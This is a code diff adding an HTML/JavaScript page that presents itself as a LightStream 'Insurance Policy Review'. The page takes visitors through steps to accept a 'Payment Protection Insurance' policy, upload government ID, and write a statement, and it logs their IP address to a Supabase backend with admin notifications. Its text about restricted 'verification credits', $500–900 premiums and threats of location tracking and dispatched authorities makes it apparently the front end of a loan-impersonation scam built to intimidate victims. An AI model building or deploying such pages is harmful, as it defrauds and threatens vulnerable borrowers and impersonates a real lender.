@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Insurance Policy Review - LightStream</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        body {
+            background: linear-gradient(135deg, #000000 0%, #1a1a1a 50%, #333333 100%);
+            min-height: 100vh;
+        }
+        .glass-effect {
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .text-cool {
+            color: #ffa500;
+        }
+        .step-indicator {
+            transition: all 0.3s ease;
+        }
+        .step-indicator.active {
+            background: #ffa500;
+            color: black;
+        }
+        .step-indicator.completed {
+            background: #10b981;
+            color: white;
+        }
+        .step-content {
+            display: none;
+        }
+        .step-content.active {
+            display: block;
+        }
+        .warning-box {
+            background: rgba(239, 68, 68, 0.1);
+            border: 2px solid #ef4444;
+        }
+        .legal-text {
+            max-height: 400px;
+            overflow-y: auto;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+    </style>
+</head>
+<body class="bg-black">
+    <!-- Header -->
+    <header class="glass-effect sticky top-0 z-50">
+        <nav class="container mx-auto px-4 py-4">
+            <div class="flex justify-between items-center">
+                <div class="flex items-center space-x-2">
+                    <img src="images/newlogo.png" alt="LightStream Logo" class="h-8 w-auto">
+                    <span class="text-xl font-bold text-white">LightStream <span class="text-cool">Insurance Policy Review</span></span>
+                </div>
+                <span class="text-gray-300 text-sm">
+                    <i class="fas fa-shield-alt mr-2"></i>Secure Review Process
+                </span>
+            </div>
+        </nav>
+    </header>
+
+    <!-- Main Content -->
+    <main class="container mx-auto px-4 py-8">
+        <!-- Progress Steps -->
+        <div class="glass-effect rounded-lg p-6 mb-8">
+            <div class="flex justify-between items-center">
+                <div class="step-indicator active w-12 h-12 rounded-full flex items-center justify-center font-bold border-2 border-gray-600" data-step="1">1</div>
+                <div class="flex-1 h-1 bg-gray-600 mx-2"></div>
+                <div class="step-indicator w-12 h-12 rounded-full flex items-center justify-center font-bold border-2 border-gray-600" data-step="2">2</div>
+                <div class="flex-1 h-1 bg-gray-600 mx-2"></div>
+                <div class="step-indicator w-12 h-12 rounded-full flex items-center justify-center font-bold border-2 border-gray-600" data-step="3">3</div>
+                <div class="flex-1 h-1 bg-gray-600 mx-2"></div>
+                <div class="step-indicator w-12 h-12 rounded-full flex items-center justify-center font-bold border-2 border-gray-600" data-step="4">4</div>
+                <div class="flex-1 h-1 bg-gray-600 mx-2"></div>
+                <div class="step-indicator w-12 h-12 rounded-full flex items-center justify-center font-bold border-2 border-gray-600" data-step="5">5</div>
+            </div>
+            <div class="flex justify-between mt-2 text-xs text-gray-400">
+                <span>Read Policy</span>
+                <span>Agree Terms</span>
+                <span>Legal Consequences</span>
+                <span>ID Proof</span>
+                <span>Confirmation</span>
+            </div>
+        </div>
+
+        <!-- Step 1: Read Legal Document -->
+        <div id="step1" class="step-content active glass-effect rounded-lg p-6 mb-8">
+            <h2 class="text-2xl font-bold text-white mb-6">
+                <i class="fas fa-file-contract mr-2 text-cool"></i>Step 1: Read Payment Protection Insurance Policy
+            </h2>
+            
+            <div class="warning-box rounded-lg p-4 mb-6">
+                <div class="flex items-start">
+                    <i class="fas fa-exclamation-triangle text-red-500 mr-3 mt-1"></i>
+                    <div>
+                        <h4 class="text-red-500 font-semibold mb-2">IMPORTANT - READ CAREFULLY</h4>
+                        <p class="text-gray-300 text-sm">You must read the entire Payment Protection Insurance policy below. By proceeding, you acknowledge that you have read and understood all terms and conditions. This is a legally binding agreement.</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="legal-text rounded-lg mb-6 text-gray-300 text-sm leading-relaxed">
+                <h3 class="text-lg font-bold text-white mb-4">LightStream Financial Services - Loan Terms & Conditions & Disclosure Policy</h3>
+                
+                <h4 class="text-cool font-semibold mb-2">1. Introduction & Purpose</h4>
+                <p class="mb-4">This document establishes the comprehensive policies, terms, and conditions governing the relationship between LightStream Financial Services and applicants/customers regarding Payment Protection Insurance (PPI), bank account verification processes, and loan transactions.</p>
+                
+                <h4 class="text-cool font-semibold mb-2">2. Payment Protection Insurance (PPI)</h4>
+                <p class="mb-4">Based on risk assessment, credit profile, loan amount, and regulatory compliance requirements, certain applicants may be required to maintain Payment Protection Insurance as a condition of loan approval. PPI premiums typically range from $500 to $900, depending on loan amount, coverage level, term duration, and individual risk factors.</p>
+                
+                <h4 class="text-cool font-semibold mb-2">3. No Out-of-Pocket Cost Policy</h4>
+                <p class="mb-4">LightStream Financial Services maintains a strict policy that customers are not required to pay Payment Protection Insurance premiums, verification fees, or compliance costs from personal funds. All required costs are structured within the loan framework.</p>
+                
+                <h4 class="text-cool font-semibold mb-2">4. Bank Account Verification & Negative Balance Policy</h4>
+                <p class="mb-4">LightStream Financial Services strictly prohibits loan disbursement into bank accounts with negative balances, restrictions, freezes, or other limitations. When verification reveals account balance issues, the Company may issue verification credits to normalize account standing.</p>
+                
+                <h4 class="text-cool font-semibold mb-2">5. Restrictions on Use of Funds</h4>
+                <p class="mb-4">Verification credits, PPI funds, and any restricted-use funds may not be withdrawn, transferred, or used for personal purposes. These funds are designated solely for specific, authorized purposes. Unauthorized use of restricted funds constitutes a material breach of these terms.</p>
+                
+                <h4 class="text-cool font-semibold mb-2">6. Customer Responsibilities & Representations</h4>
+                <p class="mb-4">Customers must provide complete, accurate, and truthful information throughout the application process. Intentional misrepresentation or omission of material facts constitutes fraud and may result in application denial, legal action, or criminal prosecution.</p>
+                
+                <h4 class="text-cool font-semibold mb-2">7. Company Rights & Remedies</h4>
+                <p class="mb-4">The Company reserves the right to reverse or cancel verification credits at any time for any reason, including suspected fraud, policy violations, or changes in verification requirements. The Company may terminate processing and withdraw any offer if policy violations are detected.</p>
+                
+                <h4 class="text-cool font-semibold mb-2">8. Misuse, Misrepresentation & Prohibited Conduct</h4>
+                <p class="mb-4">Unauthorized use includes withdrawing verification funds for personal purposes, providing false information, using restricted funds for unauthorized purposes, or attempting to circumvent verification procedures. Misuse may result in immediate application denial, termination of existing loan relationships, reporting to law enforcement agencies, credit bureau reporting, and pursuit of legal remedies.</p>
+                
+                <h4 class="text-cool font-semibold mb-2">9. Legal Consequences</h4>
+                <p class="mb-4">Customers agree to indemnify, defend, and hold harmless LightStream Financial Services from any and all claims, losses, damages, liabilities, costs, and expenses arising from false information, misuse of funds, or violation of these terms and conditions. These policies are governed by applicable U.S. federal laws and the laws of the state where the Company operates.</p>
+                
+                <h4 class="text-cool font-semibold mb-2">10. IP Address & Location Tracking</h4>
+                <p class="mb-4">For payment protection and fraud prevention purposes, your IP address and location data will be stored and monitored. In case of fraud, unauthorized fund diversion, or attempt to evade repayment obligations, this information may be used to locate you and assist law enforcement authorities in recovering funds and pursuing legal action.</p>
+            </div>
+
+            <div class="flex items-center mb-4">
+                <input type="checkbox" id="readPolicy" class="w-5 h-5 mr-3">
+                <label for="readPolicy" class="text-white">I have read and understood the entire Payment Protection Insurance policy above</label>
+            </div>
+
+            <button onclick="proceedToStep(2)" class="bg-cool text-white py-3 px-8 rounded-lg font-semibold hover:bg-orange-600 transition" id="step1Btn" disabled>
+                Proceed to Step 2 <i class="fas fa-arrow-right ml-2"></i>
+            </button>
+        </div>
+
+        <!-- Step 2: Agree to Terms -->
+        <div id="step2" class="step-content glass-effect rounded-lg p-6 mb-8">
+            <h2 class="text-2xl font-bold text-white mb-6">
+                <i class="fas fa-check-circle mr-2 text-cool"></i>Step 2: Terms & Conditions Agreement
+            </h2>
+
+            <div class="warning-box rounded-lg p-4 mb-6">
+                <div class="flex items-start">
+                    <i class="fas fa-exclamation-triangle text-red-500 mr-3 mt-1"></i>
+                    <div>
+                        <h4 class="text-red-500 font-semibold mb-2">LEGALLY BINDING AGREEMENT</h4>
+                        <p class="text-gray-300 text-sm">By checking the boxes below, you are entering into a legally binding agreement with LightStream Financial Services. Make sure you understand each term before agreeing.</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="space-y-4 mb-6">
+                <div class="flex items-start bg-black/30 rounded-lg p-4 border border-gray-700">
+                    <input type="checkbox" id="agree1" class="w-5 h-5 mr-3 mt-1">
+                    <label for="agree1" class="text-white text-sm">I acknowledge that I have read and understood all terms and conditions of the Payment Protection Insurance policy</label>
+                </div>
+                <div class="flex items-start bg-black/30 rounded-lg p-4 border border-gray-700">
+                    <input type="checkbox" id="agree2" class="w-5 h-5 mr-3 mt-1">
+                    <label for="agree2" class="text-white text-sm">I accept the Payment Protection Insurance, verification credit, and bank account policies as outlined</label>
+                </div>
+                <div class="flex items-start bg-black/30 rounded-lg p-4 border border-gray-700">
+                    <input type="checkbox" id="agree3" class="w-5 h-5 mr-3 mt-1">
+                    <label for="agree3" class="text-white text-sm">I understand that verification funds are restricted and not loan proceeds for personal use</label>
+                </div>
+                <div class="flex items-start bg-black/30 rounded-lg p-4 border border-gray-700">
+                    <input type="checkbox" id="agree4" class="w-5 h-5 mr-3 mt-1">
+                    <label for="agree4" class="text-white text-sm">I agree to comply with all requirements and obligations outlined in this document</label>
+                </div>
+                <div class="flex items-start bg-black/30 rounded-lg p-4 border border-gray-700">
+                    <input type="checkbox" id="agree5" class="w-5 h-5 mr-3 mt-1">
+                    <label for="agree5" class="text-white text-sm">I understand that declining consent may result in application withdrawal or ineligibility for loan services</label>
+                </div>
+            </div>
+
+            <div class="flex space-x-4">
+                <button onclick="proceedToStep(1)" class="bg-gray-600 text-white py-3 px-8 rounded-lg font-semibold hover:bg-gray-700 transition">
+                    <i class="fas fa-arrow-left mr-2"></i>Back
+                </button>
+                <button onclick="proceedToStep(3)" class="bg-cool text-white py-3 px-8 rounded-lg font-semibold hover:bg-orange-600 transition" id="step2Btn" disabled>
+                    Proceed to Step 3 <i class="fas fa-arrow-right ml-2"></i>
+                </button>
+            </div>
+        </div>
+
+        <!-- Step 3: Legal Consequences -->
+        <div id="step3" class="step-content glass-effect rounded-lg p-6 mb-8">
+            <h2 class="text-2xl font-bold text-white mb-6">
+                <i class="fas fa-gavel mr-2 text-cool"></i>Step 3: Legal Consequences & Warnings
+            </h2>
+
+            <div class="warning-box rounded-lg p-4 mb-6">
+                <div class="flex items-start">
+                    <i class="fas fa-exclamation-triangle text-red-500 mr-3 mt-1"></i>
+                    <div>
+                        <h4 class="text-red-500 font-semibold mb-2">SERIOUS LEGAL CONSEQUENCES</h4>
+                        <p class="text-gray-300 text-sm">Read this section carefully. These are the legal consequences if you violate the terms or attempt to evade your obligations.</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="space-y-4 mb-6">
+                <div class="bg-red-500/10 border border-red-500 rounded-lg p-4">
+                    <h4 class="text-red-500 font-semibold mb-2"><i class="fas fa-ban mr-2"></i>Fraud & Misrepresentation</h4>
+                    <p class="text-gray-300 text-sm">Intentional misrepresentation or omission of material facts constitutes fraud and may result in: application denial, legal action, criminal prosecution, reporting to law enforcement agencies, and credit bureau reporting.</p>
+                </div>
+                <div class="bg-red-500/10 border border-red-500 rounded-lg p-4">
+                    <h4 class="text-red-500 font-semibold mb-2"><i class="fas fa-money-bill-wave mr-2"></i>Unauthorized Fund Use</h4>
+                    <p class="text-gray-300 text-sm">Withdrawing verification funds for personal purposes, providing false information, or using restricted funds for unauthorized purposes constitutes a material breach. Consequences include: immediate application denial, termination of existing loan relationships, pursuit of legal remedies to recover losses.</p>
+                </div>
+                <div class="bg-red-500/10 border border-red-500 rounded-lg p-4">
+                    <h4 class="text-red-500 font-semibold mb-2"><i class="fas fa-map-marker-alt mr-2"></i>Location Tracking & Legal Action</h4>
+                    <p class="text-gray-300 text-sm">Your IP address and location data will be stored for payment protection. In case of fraud, unauthorized fund diversion, or attempt to evade repayment, this information will be used to locate you and assist law enforcement in recovering funds. Authorities may be dispatched to your registered address.</p>
+                </div>
+                <div class="bg-red-500/10 border border-red-500 rounded-lg p-4">
+                    <h4 class="text-red-500 font-semibold mb-2"><i class="fas fa-balance-scale mr-2"></i>Legal Indemnification</h4>
+                    <p class="text-gray-300 text-sm">You agree to indemnify, defend, and hold harmless LightStream Financial Services from any and all claims, losses, damages, liabilities, costs, and expenses (including reasonable attorneys' fees) arising from false information, misuse of funds, or violation of terms.</p>
+                </div>
+            </div>
+
+            <div class="flex items-center mb-4 bg-black/30 rounded-lg p-4 border border-gray-700">
+                <input type="checkbox" id="understandConsequences" class="w-5 h-5 mr-3">
+                <label for="understandConsequences" class="text-white text-sm">I understand the legal consequences outlined above and acknowledge that violation of terms may result in legal action, location tracking, and law enforcement involvement</label>
+            </div>
+
+            <div class="flex space-x-4">
+                <button onclick="proceedToStep(2)" class="bg-gray-600 text-white py-3 px-8 rounded-lg font-semibold hover:bg-gray-700 transition">
+                    <i class="fas fa-arrow-left mr-2"></i>Back
+                </button>
+                <button onclick="proceedToStep(4)" class="bg-cool text-white py-3 px-8 rounded-lg font-semibold hover:bg-orange-600 transition" id="step3Btn" disabled>
+                    Proceed to Step 4 <i class="fas fa-arrow-right ml-2"></i>
+                </button>
+            </div>
+        </div>
+
+        <!-- Step 4: ID Proof Upload -->
+        <div id="step4" class="step-content glass-effect rounded-lg p-6 mb-8">
+            <h2 class="text-2xl font-bold text-white mb-6">
+                <i class="fas fa-id-card mr-2 text-cool"></i>Step 4: Upload ID Proof
+            </h2>
+
+            <div class="warning-box rounded-lg p-4 mb-6">
+                <div class="flex items-start">
+                    <i class="fas fa-exclamation-triangle text-red-500 mr-3 mt-1"></i>
+                    <div>
+                        <h4 class="text-red-500 font-semibold mb-2">IDENTITY VERIFICATION REQUIRED</h4>
+                        <p class="text-gray-300 text-sm">You must upload a valid government-issued ID proof to verify your identity. This is mandatory for loan processing and fraud prevention.</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="bg-black/30 rounded-lg p-6 border border-gray-700 mb-6">
+                <div class="mb-4">
+                    <label class="block text-white text-sm font-medium mb-2">Select ID Type</label>
+                    <select id="idType" class="w-full bg-black/50 border border-gray-600 rounded-lg text-white p-3 focus:outline-none focus:border-cool">
+                        <option value="">Select ID Type</option>
+                        <option value="passport">Passport</option>
+                        <option value="driver_license">Driver's License</option>
+                        <option value="national_id">National ID Card</option>
+                        <option value="other">Other Government ID</option>
+                    </select>
+                </div>
+                <div class="mb-4">
+                    <label class="block text-white text-sm font-medium mb-2">Upload ID Document (Front)</label>
+                    <input type="file" id="idFront" accept="image/*,.pdf" class="w-full bg-black/50 border border-gray-600 rounded-lg text-white p-3 focus:outline-none focus:border-cool">
+                </div>
+                <div class="mb-4">
+                    <label class="block text-white text-sm font-medium mb-2">Upload ID Document (Back - if applicable)</label>
+                    <input type="file" id="idBack" accept="image/*,.pdf" class="w-full bg-black/50 border border-gray-600 rounded-lg text-white p-3 focus:outline-none focus:border-cool">
+                </div>
+                <div class="text-gray-400 text-xs">
+                    <i class="fas fa-info-circle mr-2"></i>Accepted formats: JPG, PNG, PDF. Maximum file size: 5MB
+                </div>
+            </div>
+
+            <div class="flex space-x-4">
+                <button onclick="proceedToStep(3)" class="bg-gray-600 text-white py-3 px-8 rounded-lg font-semibold hover:bg-gray-700 transition">
+                    <i class="fas fa-arrow-left mr-2"></i>Back
+                </button>
+                <button onclick="proceedToStep(5)" class="bg-cool text-white py-3 px-8 rounded-lg font-semibold hover:bg-orange-600 transition" id="step4Btn" disabled>
+                    Proceed to Step 5 <i class="fas fa-arrow-right ml-2"></i>
+                </button>
+            </div>
+        </div>
+
+        <!-- Step 5: Confirmation -->
+        <div id="step5" class="step-content glass-effect rounded-lg p-6 mb-8">
+            <h2 class="text-2xl font-bold text-white mb-6">
+                <i class="fas fa-signature mr-2 text-cool"></i>Step 5: Final Confirmation
+            </h2>
+
+            <div class="warning-box rounded-lg p-4 mb-6">
+                <div class="flex items-start">
+                    <i class="fas fa-exclamation-triangle text-red-500 mr-3 mt-1"></i>
+                    <div>
+                        <h4 class="text-red-500 font-semibold mb-2">FINAL ACKNOWLEDGMENT</h4>
+                        <p class="text-gray-300 text-sm">Write a statement confirming that you have read, understood, and agree to all terms. This statement will be stored as your legal acknowledgment.</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="bg-black/30 rounded-lg p-6 border border-gray-700 mb-6">
+                <label class="block text-white text-sm font-medium mb-2">Your IP Address: <span id="userIP" class="text-cool">Loading...</span></label>
+                <p class="text-gray-400 text-xs mb-4">Your IP address is being logged for payment protection and fraud prevention purposes.</p>
+                
+                <label class="block text-white text-sm font-medium mb-2">Write your understanding statement:</label>
+                <textarea id="understandingStatement" class="w-full bg-black/50 border border-gray-600 rounded-lg text-white p-3 focus:outline-none focus:border-cool" rows="6" placeholder="I, [Your Name], acknowledge that I have read and understood the entire Payment Protection Insurance policy. I agree to all terms and conditions outlined above. I understand that my IP address is being stored for payment protection purposes. I acknowledge that violation of these terms may result in legal action, location tracking, and law enforcement involvement."></textarea>
+            </div>
+
+            <div class="flex items-center mb-4 bg-black/30 rounded-lg p-4 border border-gray-700">
+                <input type="checkbox" id="finalConfirm" class="w-5 h-5 mr-3">
+                <label for="finalConfirm" class="text-white text-sm">I confirm that the statement above is true and accurate to the best of my knowledge</label>
+            </div>
+
+            <div class="flex space-x-4">
+                <button onclick="proceedToStep(4)" class="bg-gray-600 text-white py-3 px-8 rounded-lg font-semibold hover:bg-gray-700 transition">
+                    <i class="fas fa-arrow-left mr-2"></i>Back
+                </button>
+                <button onclick="submitReview()" class="bg-green-600 text-white py-3 px-8 rounded-lg font-semibold hover:bg-green-700 transition" id="step5Btn" disabled>
+                    <i class="fas fa-check mr-2"></i>Submit & Complete Review
+                </button>
+            </div>
+        </div>
+
+        <!-- Success Message -->
+        <div id="successMessage" class="hidden glass-effect rounded-lg p-8 text-center">
+            <div class="flex justify-center mb-6">
+                <i class="fas fa-check-circle text-6xl text-green-500"></i>
+            </div>
+            <h2 class="text-3xl font-bold text-white mb-4">Insurance Policy Review Complete</h2>
+            <p class="text-gray-300 mb-6">Your insurance policy review has been successfully completed and submitted. Your IP address and confirmation statement have been stored for payment protection purposes.</p>
+            <button onclick="redirectToDashboard()" class="bg-cool text-white py-3 px-8 rounded-lg font-semibold hover:bg-orange-600 transition">
+                Return to Dashboard <i class="fas fa-arrow-right ml-2"></i>
+            </button>
+        </div>
+    </main>
+
+    <script src="supabase-client.js"></script>
+    <script>
+        let currentStep = 1;
+        let customerEmail = '';
+
+        document.addEventListener('DOMContentLoaded', function() {
+            // Get customer email from URL parameter
+            const urlParams = new URLSearchParams(window.location.search);
+            customerEmail = urlParams.get('email') || sessionStorage.getItem('customerEmail');
+            
+            if (!customerEmail) {
+                alert('No customer email provided. Please access this page from the admin dashboard.');
+                window.location.href = 'admin-dashboard.html';
+                return;
+            }
+
+            // Get user IP address
+            getUserIP();
+
+            // Setup checkbox listeners
+            setupCheckboxListeners();
+        });
+
+        async function getUserIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                document.getElementById('userIP').textContent = data.ip;
+            } catch (error) {
+                document.getElementById('userIP').textContent = 'Unable to detect';
+            }
+        }
+
+        function setupCheckboxListeners() {
+            // Step 1
+            document.getElementById('readPolicy').addEventListener('change', function() {
+                document.getElementById('step1Btn').disabled = !this.checked;
+            });
+
+            // Step 2
+            const step2Checkboxes = ['agree1', 'agree2', 'agree3', 'agree4', 'agree5'];
+            step2Checkboxes.forEach(id => {
+                document.getElementById(id).addEventListener('change', checkStep2);
+            });
+
+            // Step 3
+            document.getElementById('understandConsequences').addEventListener('change', function() {
+                document.getElementById('step3Btn').disabled = !this.checked;
+            });
+
+            // Step 4
+            document.getElementById('idType').addEventListener('change', checkStep4);
+            document.getElementById('idFront').addEventListener('change', checkStep4);
+
+            // Step 5
+            document.getElementById('finalConfirm').addEventListener('change', checkStep5);
+        }
+
+        function checkStep2() {
+            const allChecked = ['agree1', 'agree2', 'agree3', 'agree4', 'agree5'].every(id => 
+                document.getElementById(id).checked
+            );
+            document.getElementById('step2Btn').disabled = !allChecked;
+        }
+
+        function checkStep4() {
+            const idType = document.getElementById('idType').value;
+            const idFront = document.getElementById('idFront').files.length > 0;
+            document.getElementById('step4Btn').disabled = !(idType && idFront);
+        }
+
+        function checkStep5() {
+            const statement = document.getElementById('understandingStatement').value.trim();
+            const confirmed = document.getElementById('finalConfirm').checked;
+            document.getElementById('step5Btn').disabled = !(statement && confirmed);
+        }
+
+        function proceedToStep(step) {
+            // Hide current step
+            document.getElementById(`step${currentStep}`).classList.remove('active');
+            
+            // Update step indicators
+            document.querySelector(`[data-step="${currentStep}"]`).classList.remove('active');
+            document.querySelector(`[data-step="${currentStep}"]`).classList.add('completed');
+            
+            // Show new step
+            currentStep = step;
+            document.getElementById(`step${currentStep}`).classList.add('active');
+            document.querySelector(`[data-step="${currentStep}"]`).classList.add('active');
+        }
+
+        async function submitReview() {
+            const statement = document.getElementById('understandingStatement').value;
+            const ip = document.getElementById('userIP').textContent;
+            const idType = document.getElementById('idType').value;
+
+            try {
+                // Save to Supabase
+                const { error } = await supabase
+                    .from('insurance_policy_reviews')
+                    .insert({
+                        email: customerEmail,
+                        understanding_statement: statement,
+                        ip_address: ip,
+                        id_type: idType,
+                        review_completed: true,
+                        completed_at: new Date().toISOString()
+                    });
+
+                if (error) {
+                    console.error('Error saving review:', error);
+                    alert('Error saving review. Please try again.');
+                    return;
+                }
+
+                // Add notification to admin that customer completed insurance review
+                await supabase
+                    .from('admin_notes')
+                    .insert({
+                        email: customerEmail,
+                        note_text: `Customer has completed insurance policy review. IP: ${ip}, ID Type: ${idType}. Customer agreed to all terms.`,
+                        note_type: 'insurance_completed',
+                        created_at: new Date().toISOString()
+                    });
+
+                // Show success message
+                document.getElementById('step5').classList.remove('active');
+                document.getElementById('successMessage').classList.remove('hidden');
+
+            } catch (error) {
+                console.error('Submit error:', error);
+                alert('Error submitting review. Please try again.');
+            }
+        }
+
+        function redirectToDashboard() {
+            window.location.href = 'customer-dashboard.html';
+        }
+    </script>
+</body>
+</html>
